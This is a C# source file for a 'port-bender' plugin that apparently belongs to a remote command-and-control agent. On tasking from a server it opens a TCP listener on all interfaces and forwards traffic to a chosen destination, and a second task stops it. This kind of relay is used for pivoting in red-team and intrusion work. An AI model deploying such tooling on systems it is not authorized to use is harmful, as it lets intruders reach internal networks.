using Agent.Interfaces;
using System.Text.Json;
using Agent.Models;
using System.Net;
using port_bender;

namespace Agent
{
    public class Plugin : IPlugin
    {
        public string Name => "port-bender";
        private readonly IMessageManager messageManager;
        private readonly SemaphoreSlim lifecycleGate = new(1, 1);
        private TcpForwarderSlim? forwarder;
        private string startTask = string.Empty;

        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner, IPythonManager pythonManager)
        {
            this.messageManager = messageManager;
        }

        public async Task Execute(ServerJob job)
        {
            await lifecycleGate.WaitAsync().ConfigureAwait(false);
            try
            {
                if (forwarder is not null)
                {
                    await StopAsync(job.task.id).ConfigureAwait(false);
                    return;
                }

                PortBenderArgs? args;
                try
                {
                    args = JsonSerializer.Deserialize<PortBenderArgs>(job.task.parameters);
                }
                catch (JsonException exception)
                {
                    messageManager.WriteLine($"Invalid arguments: {exception.Message}", job.task.id, true, "error");
                    return;
                }

                if (args is null || !args.Validate())
                {
                    messageManager.WriteLine("Listener port must be between 1 and 65535 and a destination is required.", job.task.id, true, "error");
                    return;
                }

                try
                {
                    IPEndPoint remote = await EndpointParser.ResolveAsync(args.destination).ConfigureAwait(false);
                    var candidate = new TcpForwarderSlim();
                    await candidate.StartAsync(new IPEndPoint(IPAddress.Any, args.port), remote).ConfigureAwait(false);
                    forwarder = candidate;
                    startTask = job.task.id;
                    messageManager.WriteLine("Started Listener.", job.task.id, true);
                }
                catch (Exception exception) when (exception is FormatException or System.Net.Sockets.SocketException)
                {
                    messageManager.WriteLine($"Failed to start listener: {exception.Message}", job.task.id, true, "error");
                }
            }
            finally
            {
                lifecycleGate.Release();
            }
        }

        private async Task StopAsync(string stopTask)
        {
            TcpForwarderSlim active = forwarder!;
            forwarder = null;
            try
            {
                await active.StopAsync().ConfigureAwait(false);
                messageManager.WriteLine("Listener Stopped.", startTask, true);
                messageManager.WriteLine("Listener Stopped.", stopTask, true);
            }
            catch (Exception exception)
            {
                messageManager.WriteLine($"Failed to stop listener: {exception.Message}", stopTask, true, "error");
            }
            finally
            {
                startTask = string.Empty;
            }
        }
    }
}
